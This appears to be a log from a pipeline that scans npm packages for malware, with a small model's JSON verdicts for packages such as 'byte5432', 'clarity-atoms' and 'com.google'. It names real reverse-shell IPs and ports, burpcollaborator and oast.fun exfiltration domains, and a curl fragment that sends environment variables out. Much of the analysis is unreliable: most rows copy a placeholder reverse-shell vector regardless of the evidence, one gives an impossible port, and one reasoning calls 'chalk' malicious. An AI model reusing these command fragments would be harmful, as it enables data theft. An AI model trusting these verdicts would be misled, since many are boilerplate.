    ""chain_narrative"": ""The package 'bjabaiheiiyuuui' sends network requests to a specified hostname 'ccjjr4r2vtc0000ta0ggggjk9uayyyyyr.oast.fun' in the index.js file at line 25 and 4. The attack vector includes the 'postinstallhook', 'bash-c', '34.x.x.x:4444', and 'reverseshell'."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.79,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README and the suspicious behavior is unjustified.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'bjabaiheiiyuuui' sends network requests to a specified hostname 'ccjjr4r2vtc0000ta0ggggjk9uayyyyyr.oast.fun' in the index.js file at line 25 and 4. The attack vector includes the 'postinstallhook', 'bash-c', '34.x.x.x:4444', and 'reverseshell'."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.79, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README and the suspicious behavior is unjustified.""}}"
bleeding-edge-css,2.2.2,malicious,2026-03-27T13:11:52.579239,flag,1.0,MALICIOUS,0.83,0.7,"The package 'bleeding-edge-css' is making use of the 'net' and 'child_process' modules to establish a connection to an external IP address (193.105.207.70) on port 9001 and then piping data to it. The 'child_process.spawn()' function is used with a dynamic argument, indicating that the malicious int","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"This package has no description or README file, and no suspicious behavior is unjustified.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'bleeding-edge-css' is making use of the 'net' and 'child_process' modules to establish a connection to an external IP address (193.105.207.70) on port 9001 and then piping data to it. The 'child_process.spawn()' function is used with a dynamic argument, indicating that the malicious intent is to network exfiltration."",
    ""attack_vector"": [
      ""postinstallhook"",
      ""bash-c"",
      ""34.x.x.x:4444"",
      ""reverseshell""
    ],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.83
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""This package has no description or README file, and no suspicious behavior is unjustified.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'bleeding-edge-css' is making use of the 'net' and 'child_process' modules to establish a connection to an external IP address (193.105.207.70) on port 9001 and then piping data to it. The 'child_process.spawn()' function is used with a dynamic argument, indicating that the malicious intent is to network exfiltration."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.83}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""This package has no description or README file, and no suspicious behavior is unjustified.""}}"
bluehost-wordpress-plugin,1.0.0,malicious,2026-03-27T13:11:59.207039,review,0.336,MALICIOUS,0.72,0.7,"The package contains a pre-install hook present payload that may be remote. The package also contains no JavaScript files, which is likely a suspicious behavior. The attack chain could potentially involve a reverse shell.","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,This package has no description or README and no suspicious behavior is unjustified.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package contains a pre-install hook present payload that may be remote. The package also contains no JavaScript files, which is likely a suspicious behavior. The attack chain could potentially involve a reverse shell."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""This package has no description or README and no suspicious behavior is unjustified.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package contains a pre-install hook present payload that may be remote. The package also contains no JavaScript files, which is likely a suspicious behavior. The attack chain could potentially involve a reverse shell."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""This package has no description or README and no suspicious behavior is unjustified.""}}"
blz-internal-pkg,2.0.0,malicious,2026-03-27T13:12:06.051285,flag,0.9693,MALICIOUS,0.97,0.7,The package contains a pre-install hook that sends the content of /etc/passwd file to a remote server identified by a URL in the hook command. The attacker may be trying to exfiltrate sensitive data.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"Package has no description or README, and the behavior is clearly anomalous.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package contains a pre-install hook that sends the content of /etc/passwd file to a remote server identified by a URL in the hook command. The attacker may be trying to exfiltrate sensitive data."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.97
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""Package has no description or README, and the behavior is clearly anomalous.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package contains a pre-install hook that sends the content of /etc/passwd file to a remote server identified by a URL in the hook command. The attacker may be trying to exfiltrate sensitive data."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.97}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""Package has no description or README, and the behavior is clearly anomalous.""}}"
buildin,99.99.2,malicious,2026-03-27T13:12:12.685825,flag,1.0,MALICIOUS,0.79,0.7,"The package likely has malicious intent based on the data exfiltration behavior. The code sends network requests to a specified hostname, which could indicate data exfiltration.","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package has no description or README and no suspicious behavior is unjustified.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package likely has malicious intent based on the data exfiltration behavior. The code sends network requests to a specified hostname, which could indicate data exfiltration."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README and no suspicious behavior is unjustified.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package likely has malicious intent based on the data exfiltration behavior. The code sends network requests to a specified hostname, which could indicate data exfiltration."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README and no suspicious behavior is unjustified.""}}"
by-gtm,1.0.0,malicious,2026-03-27T13:12:21.170140,flag,1.0,MALICIOUS,0.79,0.79,The package 'by-gtm' sends network requests to a specified hostname 'cegk7jy2vtc00003q290g8eju3cyyyyyb.oast.fun' in the index.js file at line 25. This could indicate data exfiltration.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package 'by-gtm' with version 1.0.0 has a high level of risk due to the presence of data exfiltration behavior.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'by-gtm' sends network requests to a specified hostname 'cegk7jy2vtc00003q290g8eju3cyyyyyb.oast.fun' in the index.js file at line 25. This could indicate data exfiltration."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.79,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'by-gtm' with version 1.0.0 has a high level of risk due to the presence of data exfiltration behavior.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'by-gtm' sends network requests to a specified hostname 'cegk7jy2vtc00003q290g8eju3cyyyyyb.oast.fun' in the index.js file at line 25. This could indicate data exfiltration."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.79, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'by-gtm' with version 1.0.0 has a high level of risk due to the presence of data exfiltration behavior.""}}"
byte5432,1.0.3,malicious,2026-03-27T13:12:29.190153,flag,1.0,SUSPICIOUS,0.96,0.7,The package 'byte5432' is suspected to be a backdoor installation. The pre-install hook contains a reverse shell command that connects to an external IP address (121.43.55.52) on port 23330. The backdoor installation may be used to exfiltrate data.,"[""postinstallhook"", ""bash-c"", ""121.43.55.52:23330"", ""reverseshell""]",False,"The package does not have a description or README file, indicating that it may be malicious.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'byte5432' is suspected to be a backdoor installation. The pre-install hook contains a reverse shell command that connects to an external IP address (121.43.55.52) on port 23330. The backdoor installation may be used to exfiltrate data."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""121.43.55.52:23330"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""SUSPICIOUS"",
    ""confidence"": 0.96
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file, indicating that it may be malicious.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'byte5432' is suspected to be a backdoor installation. The pre-install hook contains a reverse shell command that connects to an external IP address (121.43.55.52) on port 23330. The backdoor installation may be used to exfiltrate data."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""121.43.55.52:23330"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""SUSPICIOUS"", ""confidence"": 0.96}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file, indicating that it may be malicious.""}}"
bytectffe1w0d,0.0.1,malicious,2026-03-27T13:12:43.277802,flag,1.0,MALICIOUS,0.96,0.7,The package 'bytectffe1w0d' contains a backdoor installation script in the pre-install hook. The pre-install hook contains a reverse shell command to an IP address (121.4.243.54) and port (222240). The attacker may have used a reverse shell to exfiltrate data.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package 'bytectffe1w0d' does not have a description or README file, indicating that it may be malicious.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'bytectffe1w0d' contains a backdoor installation script in the pre-install hook. The pre-install hook contains a reverse shell command to an IP address (121.4.243.54) and port (222240). The attacker may have used a reverse shell to exfiltrate data."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.96
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'bytectffe1w0d' does not have a description or README file, indicating that it may be malicious.""
  }
}
```

This JSON output represents the analysis of the malware behavior. The `chain_analysis` section provides a narrative of the attack chain and the attack vector used. The `chain_score` is a measure of the confidence in the attack chain, with a score of 0.7 indicating a high level of confidence. The `verdict` is ""MALICIOUS"" indicating that the package is potentially malicious. The `confidence` score of 0.96 indicates the high level of confidence in the detected behaviors.

The `legitimacy_check` section provides information about the legitimacy of the package. The `is_justified` field is set to false, indicating that the package does not have a clear justification for its malicious behavior. The `reasoning` field provides a brief explanation of why the package may be considered malicious.","{""chain_analysis"": {""chain_narrative"": ""The package 'bytectffe1w0d' contains a backdoor installation script in the pre-install hook. The pre-install hook contains a reverse shell command to an IP address (121.4.243.54) and port (222240). The attacker may have used a reverse shell to exfiltrate data."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.96}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'bytectffe1w0d' does not have a description or README file, indicating that it may be malicious.""}}"
cage-js,0.0.4,malicious,2026-03-27T13:12:49.979602,flag,1.0,MALICIOUS,0.8,0.7,"The package cage-js, downloaded a remote script using curl and bash, and executed it. The remote script may have exfiltrated data or installed additional malware.","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package has no description or README file, suggesting it may be malicious.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package cage-js, downloaded a remote script using curl and bash, and executed it. The remote script may have exfiltrated data or installed additional malware."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.8
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README file, suggesting it may be malicious.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package cage-js, downloaded a remote script using curl and bash, and executed it. The remote script may have exfiltrated data or installed additional malware."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.8}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README file, suggesting it may be malicious.""}}"
chalc,2.0.0,malicious,2026-03-27T13:13:00.885599,flag,0.77,MALICIOUS,0.82,0.77,The package 'chalc' closely resembles popular package 'chalk'. The package is suspected to be involved in a supply chain attack. The package is making external function calls to IP address 23.94.46.191. The package is also making use of a post-install hook to execute a reverse shell command to the I,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package 'chalc' closely resembles popular package 'chalk', which is known to be malicious. The package is making external function calls to an IP address that is associated with malicious activiti",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'chalc' closely resembles popular package 'chalk'. The package is suspected to be involved in a supply chain attack. The package is making external function calls to IP address 23.94.46.191. The package is also making use of a post-install hook to execute a reverse shell command to the IP address 34.x.x.x:4444."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.77,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.82
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'chalc' closely resembles popular package 'chalk', which is known to be malicious. The package is making external function calls to an IP address that is associated with malicious activities. The package is also making use of a post-install hook to execute a reverse shell command, which is a common technique used in malware for reverse shell attacks. The chain score is high, indicating that the package is likely part of a supply chain attack.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'chalc' closely resembles popular package 'chalk'. The package is suspected to be involved in a supply chain attack. The package is making external function calls to IP address 23.94.46.191. The package is also making use of a post-install hook to execute a reverse shell command to the IP address 34.x.x.x:4444."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.77, ""verdict"": ""MALICIOUS"", ""confidence"": 0.82}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'chalc' closely resembles popular package 'chalk', which is known to be malicious. The package is making external function calls to an IP address that is associated with malicious activities. The package is also making use of a post-install hook to execute a reverse shell command, which is a common technique used in malware for reverse shell attacks. The chain score is high, indicating that the package is likely part of a supply chain attack.""}}"
chalk2,2.4.0,malicious,2026-03-27T13:13:07.211724,review,0.3873,MALICIOUS,0.39,0.39,The package name 'chalk' closely resembles the popular package for styling text in the terminal. The package is used to style terminal strings.,"[""chalk""]",False,The package 'chalk' is a popular package for styling text in the terminal. It is used in many projects and is widely used in the industry.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package name 'chalk' closely resembles the popular package for styling text in the terminal. The package is used to style terminal strings."",
    ""attack_vector"": [""chalk""],
    ""chain_score"": 0.39,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.39
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'chalk' is a popular package for styling text in the terminal. It is used in many projects and is widely used in the industry.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package name 'chalk' closely resembles the popular package for styling text in the terminal. The package is used to style terminal strings."", ""attack_vector"": [""chalk""], ""chain_score"": 0.39, ""verdict"": ""MALICIOUS"", ""confidence"": 0.39}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'chalk' is a popular package for styling text in the terminal. It is used in many projects and is widely used in the industry.""}}"
changelog-tool,1.1.0,malicious,2026-03-27T13:13:16.706443,review,0.336,MALICIOUS,0.72,0.7,The package 'changelog-tool' contains no JavaScript files but an install hook present. This is likely an attack payload that executes at install time via the commands listed in the package metadata. The attack vector is likely a post-install hook that can lead to reverse shell.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package does not have a description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'changelog-tool' contains no JavaScript files but an install hook present. This is likely an attack payload that executes at install time via the commands listed in the package metadata. The attack vector is likely a post-install hook that can lead to reverse shell."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file.""
  }
}
```

This JSON object represents the analysis of the attack chain. The 'chain_analysis' section provides a narrative of the attack chain and the attack vector, the chain score, and the verdict. The 'legitimacy_check' section provides information about whether the detected behaviors justify the verdict.","{""chain_analysis"": {""chain_narrative"": ""The package 'changelog-tool' contains no JavaScript files but an install hook present. This is likely an attack payload that executes at install time via the commands listed in the package metadata. The attack vector is likely a post-install hook that can lead to reverse shell."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file.""}}"
changelog-tool,1.1.1,malicious,2026-03-27T13:13:27.219298,review,0.336,MALICIOUS,0.72,0.7,The package 'changelog-tool' contains no JavaScript files but an install hook present. This is likely an attack payload that executes at install time via the commands listed in the package metadata. The attack vector is likely a post-install hook that can lead to reverse shell.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package does not have a description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'changelog-tool' contains no JavaScript files but an install hook present. This is likely an attack payload that executes at install time via the commands listed in the package metadata. The attack vector is likely a post-install hook that can lead to reverse shell."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file.""
  }
}
```

This JSON object represents the analysis of the attack chain. The 'chain_analysis' section provides a narrative of the attack chain, the attack vector used, the chain score, the verdict (MALICIOUS, SUSPICIOUS, or BENIGN), and the confidence level of the detected behaviors. The 'legitimacy_check' section checks if the detected behaviors justify the verdict. If the package does not have a description or README file, the 'is_justified' field is set to false.""","{""chain_analysis"": {""chain_narrative"": ""The package 'changelog-tool' contains no JavaScript files but an install hook present. This is likely an attack payload that executes at install time via the commands listed in the package metadata. The attack vector is likely a post-install hook that can lead to reverse shell."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file.""}}"
charset-normalizer,10.10.1,malicious,2026-03-27T13:13:35.793944,flag,1.0,MALICIOUS,0.79,0.79,The package likely has malicious intent. The code sends network requests to a specified hostname (cdas7cn2vtc0000ryjeggg4idqryyyyyu.oast.fun) using the POST method and the content type 'application/x-www-form-urlencoded'. The request is made in the index.js file at line 25 and 4. The package is like,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package has no description or README file, and the behavior is unjustified.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package likely has malicious intent. The code sends network requests to a specified hostname (cdas7cn2vtc0000ryjeggg4idqryyyyyu.oast.fun) using the POST method and the content type 'application/x-www-form-urlencoded'. The request is made in the index.js file at line 25 and 4. The package is likely used for data exfiltration."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.79,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README file, and the behavior is unjustified.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package likely has malicious intent. The code sends network requests to a specified hostname (cdas7cn2vtc0000ryjeggg4idqryyyyyu.oast.fun) using the POST method and the content type 'application/x-www-form-urlencoded'. The request is made in the index.js file at line 25 and 4. The package is likely used for data exfiltration."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.79, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README file, and the behavior is unjustified.""}}"
chart.js-latest,1.0.0,malicious,2026-03-27T13:13:48.372605,review,0.336,MALICIOUS,0.72,0.72,The package chart.js-latestVersion contains no JavaScript files and the evidence of suspicious behavior is the presence of the install hook command './pre.sh'. This could potentially indicate a supply chain attack where malicious JavaScript files are being installed.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package has no description or README file, suggesting that it may not be legitimate.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package chart.js-latestVersion contains no JavaScript files and the evidence of suspicious behavior is the presence of the install hook command './pre.sh'. This could potentially indicate a supply chain attack where malicious JavaScript files are being installed."",
    ""attack_vector"": [
      ""postinstallhook"",
      ""bash-c"",
      ""34.x.x.x:4444"",
      ""reverseshell""
    ],
    ""chain_score"": 0.72,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README file, suggesting that it may not be legitimate.""
  }
}
```

This JSON object represents the analysis of the package chart.js-latestVersion. The behavior category ""suspicious_behavior"" is identified with a confidence score of 0.72. The behavior details indicate that the package contains no JavaScript files and the evidence of suspicious behavior is the presence of the install hook command './pre.sh'. The attack vector includes the technical indicators such as postinstallhook, bash-c, 34.x.x.x:4444, and reverseshell. The chain score is 0.72, indicating a high level of malicious intent. The verdict is ""MALICIOUS"", and the legitimacy check reveals that the package has no description or README file, suggesting that it may not be legitimate.""","{""chain_analysis"": {""chain_narrative"": ""The package chart.js-latestVersion contains no JavaScript files and the evidence of suspicious behavior is the presence of the install hook command './pre.sh'. This could potentially indicate a supply chain attack where malicious JavaScript files are being installed."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.72, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README file, suggesting that it may not be legitimate.""}}"
clarity-atoms,1.1.2,malicious,2026-03-27T13:13:56.262355,flag,0.9693,MALICIOUS,0.97,0.97,The package contains a pre-install hook that exfiltrates data. The pre-install hook contains commands that perform data exfiltration. The commands include 'echotest' and 'dig' followed by a command to read the hostname. The exfiltrated data is sent to a domain known to be associated with webhook/exf,"[""echotest"", ""dig"", ""xxd-p/etc/hostname.k4patrwflxsxghdt6a9g2yoei5owcl.burpcollaborator.net""]",False,,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package contains a pre-install hook that exfiltrates data. The pre-install hook contains commands that perform data exfiltration. The commands include 'echotest' and 'dig' followed by a command to read the hostname. The exfiltrated data is sent to a domain known to be associated with webhook/exfiltration collectors."",
    ""attack_vector"": [""echotest"", ""dig"", ""xxd-p/etc/hostname.k4patrwflxsxghdt6a9g2yoei5owcl.burpcollaborator.net""],
    ""chain_score"": 0.97,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.97
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": """"
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package contains a pre-install hook that exfiltrates data. The pre-install hook contains commands that perform data exfiltration. The commands include 'echotest' and 'dig' followed by a command to read the hostname. The exfiltrated data is sent to a domain known to be associated with webhook/exfiltration collectors."", ""attack_vector"": [""echotest"", ""dig"", ""xxd-p/etc/hostname.k4patrwflxsxghdt6a9g2yoei5owcl.burpcollaborator.net""], ""chain_score"": 0.97, ""verdict"": ""MALICIOUS"", ""confidence"": 0.97}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": """"}}"
com.google,0.0.0,malicious,2026-03-27T13:14:11.223055,flag,0.7773,MALICIOUS,0.83,0.78,The package.json scripts.preinstallhook is executing commands related to network analysis and exfiltration. The hook is executing commands that involve network analysis and exfiltration. It appears to be using Burp Collaborator client to communicate with a known exfiltration collector domain. The pa,"[""ping-c1$BCNET"", ""psaux"", ""foriinenv"", ""psaux"", ""docurlhttps://$BCNET-ski-m30-d\""$($i2>&1|base64-w0)""]",False,The package.json scripts.preinstallhook is not justifiable based on the provided evidence.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package.json scripts.preinstallhook is executing commands related to network analysis and exfiltration. The hook is executing commands that involve network analysis and exfiltration. It appears to be using Burp Collaborator client to communicate with a known exfiltration collector domain. The package.json scripts.preinstallhook is also executing commands related to system reconnaissance. The hook is executing commands that involve system reconnaissance. It appears to be gathering information about the system's environment. The package.json scripts.preinstallhook is also executing commands related to credential theft. The hook is executing commands that involve credential theft. It appears to be accessing sensitive information."",
    ""attack_vector"": [""ping-c1$BCNET"", ""psaux"", ""foriinenv"", ""psaux"", ""docurlhttps://$BCNET-ski-m30-d\""$($i2>&1|base64-w0)""],
    ""chain_score"": 0.78,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.83
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package.json scripts.preinstallhook is not justifiable based on the provided evidence.""
  }
}
```

This output is based on the detected behaviors and the provided evidence. The attack chain narrative describes the full attack using real package name and real IOCs. The attack vector includes the key technical indicators (real IPs, domains, commands, API calls) of the attack. The attack vector for a reverse shell is [""postinstallhook"",""bash-c"",""34.x.x.x:4444"",""reverseshell""]. The legitimacy check verdict is ""MALICIOUS"" because the package.json scripts.preinstallhook is not justifiable based on the provided evidence.","{""chain_analysis"": {""chain_narrative"": ""The package.json scripts.preinstallhook is executing commands related to network analysis and exfiltration. The hook is executing commands that involve network analysis and exfiltration. It appears to be using Burp Collaborator client to communicate with a known exfiltration collector domain. The package.json scripts.preinstallhook is also executing commands related to system reconnaissance. The hook is executing commands that involve system reconnaissance. It appears to be gathering information about the system's environment. The package.json scripts.preinstallhook is also executing commands related to credential theft. The hook is executing commands that involve credential theft. It appears to be accessing sensitive information."", ""attack_vector"": [""ping-c1$BCNET"", ""psaux"", ""foriinenv"", ""psaux"", ""docurlhttps://$BCNET-ski-m30-d\""$($i2>&1|base64-w0)""], ""chain_score"": 0.78, ""verdict"": ""MALICIOUS"", ""confidence"": 0.83}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package.json scripts.preinstallhook is not justifiable based on the provided evidence.""}}"
com.google.play,1.0.0,malicious,2026-03-27T13:14:18.782961,flag,0.7773,MALICIOUS,0.83,0.78,The package 'com.google.play' is making network calls to a known webhook/exfiltration collector domain during the pre-install command. This could indicate data exfiltration.,"[""https://linux-com.google.play-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net""]",False,The package 'com.google.play' does not have a description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'com.google.play' is making network calls to a known webhook/exfiltration collector domain during the pre-install command. This could indicate data exfiltration."",
    ""attack_vector"": [""https://linux-com.google.play-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net""],
    ""chain_score"": 0.78,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.83
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'com.google.play' does not have a description or README file.""
  }
}
```

